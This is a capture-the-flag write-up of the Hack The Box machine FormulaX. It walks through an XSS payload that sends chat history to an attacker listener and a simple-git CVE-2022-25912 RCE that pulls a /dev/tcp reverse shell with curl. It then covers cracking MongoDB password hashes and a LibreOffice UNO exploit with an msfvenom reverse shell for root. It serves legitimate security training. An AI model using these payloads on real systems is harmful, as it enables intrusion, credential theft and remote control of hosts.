---
title: HTB - FormulaX
date: 2024-08-18 00:00:00 + 1000
categories: [Linux,Web App,CTF,HTB]
tags: [htb,WebExploitation, XSS, CVE-2022-25912, MongoDB, simple-git, LibreOffice]
comments: false
---

This Hard-rated Linux FormulaX HTB machine was rooted by exploiting a DOM-based XSS vulnerability to find a simple-git, which was then exploited with a known RCE (CVE-2022-25912) to gain initial access. Privilege escalation was achieved by leveraging a vulnerable LibreOffice script running with sudo permissions, allowing for command execution and ultimately, root access

## Common Enumeration

### Nmap

Running the `nmap -p- -sV -sC -oA recon/allport 10.10.11.6 --open` - which found only two open ports 

- SSH 22
- HTTP 80

```bash
$ nmap -p- -sV -sC -oA recon/allport 10.10.11.6 --open
Starting Nmap 7.92 ( https://nmap.org ) at 2024-08-16 11:31 AEST
Nmap scan report for 10.10.11.6
Host is up (0.0032s latency).
Not shown: 65532 closed tcp ports (conn-refused), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5f:b2:cd:54:e4:47:d1:0e:9e:81:35:92:3c:d6:a3:cb (ECDSA)
|_  256 b9:f0:0d:dc:05:7b:fa:fb:91:e6:d0:b4:59:e6:db:88 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was /static/index.html
|_http-cors: GET POST
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
```

### Exploring the Web Application - HTTP 80

Negativing to `http://10.10.11.6/` - brings up the login page for "24/7 Problem-Solving Chatbot"

![img](/assets/img/FormulaX/1.webp)

Gobuster found the following directory

```bash
$ gobuster dir -u 'http://10.10.11.6/' -w '/usr/share/wordlists/SecLists/Discover
y/Web-Content/raft-medium-directories.txt' -o recon/gobuster                                                            
===============================================================                                                         
Gobuster v3.5                                                                                                           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                           
===============================================================                                                         
[+] Url:                     http://10.10.11.6/                                                                         
[+] Method:                  GET                                                                                        
[+] Threads:                 10                                                                                         
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt            
[+] Negative Status codes:   404                                                                                        
[+] User Agent:              gobuster/3.5                                                                               
[+] Timeout:                 10s                                                                                        
===============================================================
2024/08/16 11:55:44 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 200) [Size: 46]
/scripts              (Status: 301) [Size: 181] [--> /scripts/]
/logout               (Status: 200) [Size: 46]
/img                  (Status: 301) [Size: 173] [--> /img/]
/Scripts              (Status: 301) [Size: 181] [--> /Scripts/]
/Admin                (Status: 200) [Size: 46]
/static               (Status: 301) [Size: 179] [--> /static/]
/chat                 (Status: 200) [Size: 46]
/ADMIN                (Status: 200) [Size: 46]
/static               (Status: 301) [Size: 179] [--> /static/]
/chat                 (Status: 200) [Size: 46]
/ADMIN                (Status: 200) [Size: 46]
/restricted           (Status: 301) [Size: 187] [--> /restricted/]
/contact_us           (Status: 200) [Size: 46]
/Chat                 (Status: 200) [Size: 46]
/Logout               (Status: 200) [Size: 46]
/SCRIPTS              (Status: 301) [Size: 181] [--> /SCRIPTS/]
/ChangePassword       (Status: 200) [Size: 46]
/Contact_Us           (Status: 200) [Size: 46]
/CHAT                 (Status: 200) [Size: 46]
/changepassword       (Status: 200) [Size: 46]
/Contact_us           (Status: 200) [Size: 46]
/changePassword       (Status: 200) [Size: 46]
Progress: 23637 / 30001 (78.79%)[ERROR] 2024/08/16 11:56:17 [!] parse "http://10.10.11.6/error\x1f_log": net/url: invalid control character in URL
Progress: 29897 / 30001 (99.65%)
===============================================================
2024/08/16 11:56:27 Finished
===============================================================
```

Since there wasn't much else to go on, I decided to create an account
### Creating New Account

I registered a new account with the username `hello@me.htb` and the password `password`. Logging in brought me to the chatbot's home page

![img](/assets/img/FormulaX/2.webp)

The chatbot itself wasn't very helpful

![img](/assets/img/FormulaX/3.webp)

Typing `help` to see if there were any built-in commands. This showed the `history` command, which allowed me to view my conversation history. However, I couldn't see any other users history, which would have been a goldmine!

![img](/assets/img/FormulaX/4.webp)

### Cross-Site Scripting (XSS)

Since the chatbot wasn't giving me much to work with, I decided to try my luck with Cross-Site Scripting (XSS). I focused on the `/contact_us` page as a potential entry point

```js
<img src=x onerror="document.location='http://10.10.14.3:1337/PoC.js'"/>
```

To catch this redirection, I set up a simple Python listener

```bash
$ python3 -m http.server 1337
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.11.6 - - [16/Aug/2024 13:11:40] "GET / HTTP/1.1" 200 -
10.10.11.6 - - [16/Aug/2024 13:11:42] "GET / HTTP/1.1" 200 -
10.10.11.6 - - [16/Aug/2024 13:11:46] "GET / HTTP/1.1" 200 -
```

It seemed I had stumbled upon a DOM-based XSS vulnerability. The `Show_messages_on_screen_of_Client` function in the JavaScript code was encoding messages before injecting them into the DOM, but there was a way around it

```js
const Show_messages_on_screen_of_Client = (value) => {
  value = htmlEncode(value);

  const div = document.createElement('div');
  div.classList.add('container');
  div.classList.add('darker');
  div.innerHTML = `  
    <h2>&#129302;  </h2>
    <p>${value}</p>
  `;
  document.getElementById('big_container').appendChild(div);
}
```

I created a proof-of-concept (PoC) JavaScript payload to exploit this

```js
const script = document.createElement('script');
script.src = '/socket.io/socket.io.js';
document.head.appendChild(script);
script.addEventListener('load', function() {

    const res = axios.get(`/user/api/chat`);
    const socket = io('/', { withCredentials: true });
    
    socket.on('message', (msg) => {
        fetch("http://10.10.14.3:1337/?d=" + msg);
    });

    socket.emit('client_message', 'history');
});
```

I base64-encoded the payload

```js
<img src=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CgogICAgY29uc3QgcmVzID0gYXhpb3MuZ2V0KGAvdXNlci9hcGkvY2hhdGApOwogICAgY29uc3Qgc29ja2V0ID0gaW8oJy8nLCB7IHdpdGhDcmVkZW50aWFsczogdHJ1ZSB9KTsKICAgIAogICAgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG1zZykgPT4gewogICAgICAgIGZldGNoKCJodHRwOi8vMTAuMTAuMTQuMzoxMzM3Lz9kPSIgKyBtc2cpOwogICAgfSk7CgogICAgc29ja2V0LmVtaXQoJ2NsaWVudF9tZXNzYWdlJywgJ2hpc3RvcnknKTsKfSk7"));'></img>
```

My listener (`python3 -m http.server 1337`) caught something juicy: `dev-git-auto-update.chatbot.htb`!

```bash
$ python3 -m http.server 1337                               15:14:17 [30/217]
Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
10.10.11.6 - - [16/Aug/2024 15:14:15] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [16/Aug/2024 15:14:15] "OPTIONS /?d=Greetings!.%20How%20can%20i%20help%20you%20today%20?.%20You%20can%20t
ype%20help%20to%20see%20some%20buildin%20commands HTTP/1.1" 501 -
10.10.11.6 - - [16/Aug/2024 15:14:15] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [16/Aug/2024 15:14:15] "OPTIONS /?d=Hello,%20I%20am%20Admin.Testing%20the%20Chat%20Application HTTP/1.1"
501 -
10.10.11.6 - - [16/Aug/2024 15:14:15] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [16/Aug/2024 15:14:15] "OPTIONS /?d=Write%20a%20script%20for%20%20dev-git-auto-update.chatbot.htb%20to%20
work%20properly HTTP/1.1" 501 -
10.10.11.6 - - [16/Aug/2024 15:14:15] code 501, message Unsupported method ('OPTIONS')
10.10.11.6 - - [16/Aug/2024 15:14:15] "OPTIONS /?d=Write%20a%20script%20to%20automate%20the%20auto-update HTTP/1.1" 501
```

Which I added to my `/etc/hosts` file

```bash
10.10.11.6    chatbot.htb dev-git-auto-update.chatbot.htb
```
## Git Auto Report Generator and RCE

Next, browsing the `dev-git-auto-update.chatbot.htb` brings up the following page and it's using simple-git v3.14

![img](/assets/img/FormulaX/5.webp)

After some digging, I found it was vulnerable to [CVE-2022-25912](https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221), a Remote Code Execution (RCE) vulnerability! Time to exploit!
### PoC - Firing the Exploit (CVE-2022-25912)

Here's the payload I used

```bash
$ cat payload 
sh -i >& /dev/tcp/10.10.14.3/1337 0>&1
```

![img](/assets/img/FormulaX/6.webp)

And the command to execute it via "http://dev-git-auto-update.chatbot.htb"

```bash
ext::sh -c curl% http://10.10.14.3:8000/payload|bash
```

## Shell as www-data - First Foothold

Boom! I landed a shell as the `www-data`

```bash
$ nc -lvnp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.11.6.
Ncat: Connection from 10.10.11.6:53768.
sh: 0: cant access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ 
```

I upgraded my shell to a more interactive one using Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

While poking around, I found `/var/www/app/configuration/connect_db.js`, which shows a MongoDB database called "testing"

```bash
$ cat connect_db.js 
import mongoose from "mongoose";

const connectDB= async(URL_DATABASE)=>{
    try{
        const DB_OPTIONS={
            dbName : "testing"
        }
        mongoose.connect(URL_DATABASE,DB_OPTIONS)
        console.log("Connected Successfully TO Database")
    }catch(error){
        console.log(`Error Connecting to the ERROR ${error}`);
    }
}

export default connectDB
```

I enumerated the MongoDB database and found two users: "admin" and "frank_dorky," each with a hashed password.

```bash
> use testing
switched to db testing
> show collections
messages
users
> db.users.find()
{ "_id" : ObjectId("648874de313b8717284f457c"), "name" : "admin", "email" : "admin@chatbot.htb", "password" : "$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.", "terms" : true, "value" : true, "authorization_token" : "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjM3ODk0Mzd9.P7kcydVeJuelgUG03rgRVZC2QUpvfJuvOPC4s5qtiaw", "__v" : 0 }
{ "_id" : ObjectId("648874de313b8717284f457d"), "name" : "frank_dorky", "email" : "frank_dorky@chatbot.htb", "password" : "$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6", "terms" : true, "value" : true, "authorization_token" : " ", "__v" : 0 }
```

The `password` field for `frank_dorky` was a hash, so I fired up John the Ripper to crack it

```bash
$ john hash --wordlist=/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou-40.txt
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
manchesterunited (?)
1g 0:00:00:14 100% 0.07122g/s 200.0p/s 200.0c/s 200.0C/s mygirl..febrero
Use the "--show" option to display all of the cracked passwords reliably
Session completed

$ john hash --show
?:manchesterunited
```

Credentials: `frank_dorky:manchesterunited`

## SSH frank_dorky and kai_relay
### SSH as frank_dorky

I used these credentials to SSH into the box as `frank_dorky` and grep the user flag

```bash
$ ls -l
total 4
-rw-r--r-- 1 root frank_dorky 33 Aug 16 01:26 user.txt
frank_dorky@formulax:~$ cat user.txt 
d26ff6a5...
```

user.txt

```text
d26ff6a5...
```

After some more digging and chatting with other players, I learned about another user: `kai_relay`. The password for this user, `mychemicalformulaX`, was found in the `/opt/librenms/config_to_json.php`

![img](/assets/img/FormulaX/7.webp)

### SSH as kai_relay

I used these credentials to SSH into the box as `kai_relay`

```bash
$ ssh kai_relay@localhost 
kai_relay@formulax:~$ id
uid=1001(kai_relay) gid=1001(kai_relay) groups=1001(kai_relay),27(sudo),999(librenms)
```

## Privilege Escalation

I checked for any easy ways to escalate privileges. Found `/usr/bin/office.sh` command can run with `sudo` permissions without a password

```bash
$ sudo -l
Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset,
    timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
```

Content of office.sh - This command starts LibreOffice Calc in headless mode, sets up LibreOffice to accept remote connections over a socket on port `2002`

```bash
$ cat /usr/bin/office.sh
#!/bin/bash
/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
```

After some digging I came across [Apache UNO / LibreOffice Version: 6.1.2 / OpenOffice 4.1.6 API - Remote Code Execution Exploit](https://0day.today/exploit/32356) - I grabbed the PoC.py script

```python
import uno
from com.sun.star.system import XSystemShellExecute
import argparse
 
parser = argparse.ArgumentParser()
parser.add_argument('--host', help='host to connect to', dest='host', required=True)
parser.add_argument('--port', help='port to connect to', dest='port', required=True)
 
args = parser.parse_args()
# Define the UNO component
localContext = uno.getComponentContext()
 
# Define the resolver to use, this is used to connect with the API
resolver = localContext.ServiceManager.createInstanceWithContext(
                                "com.sun.star.bridge.UnoUrlResolver", localContext )
 
# Connect with the provided host on the provided target port
print("[+] Connecting to target...")
context = resolver.resolve(
        "uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))
     
# Issue the service manager to spawn the SystemShellExecute module and execute calc.exe
service_manager = context.ServiceManager
print("[+] Connected to {0}".format(args.host))
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
shell_execute.execute("/tmp/shell", '',1)
```

I generated a reverse shell payload using msfvenom

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=1337 -f elf > shell
```

Then, I uploaded both `shell` and `PoC.py` to the target machine and made `shell` executable

```bash
kai_relay@formulax:/tmp$ ls -la
-rw-rw-r--  1 kai_relay kai_relay  1145 Aug 16 09:23 PoC.py
-rwxrwxr-x  1 kai_relay kai_relay   194 Aug 16 09:41 shell
```

Started a listener

```bash
$ nc -lvnp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
```

I ran the `office.sh` script with sudo privileges

```bash
kai_relay@formulax:~$ sudo /usr/bin/office.sh
```

And finally, ran the exploit

```bash
frank_dorky@formulax:/tmp$ python3 PoC.py --host 127.0.0.1 --port 2002
[+] Connecting to target...
[+] Connected to 127.0.0.1
frank_dorky@formulax:/tmp$ 
```

My listener caught the shell, and I was root!

```bash
$ nc -lvnp 1337
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.11.6.
Ncat: Connection from 10.10.11.6:35008.

id
uid=0(root) gid=0(root) groups=0(root)
whoami
root
cat /root/root.txt
90a89053...
```

root.txt

```text
90a89053...
```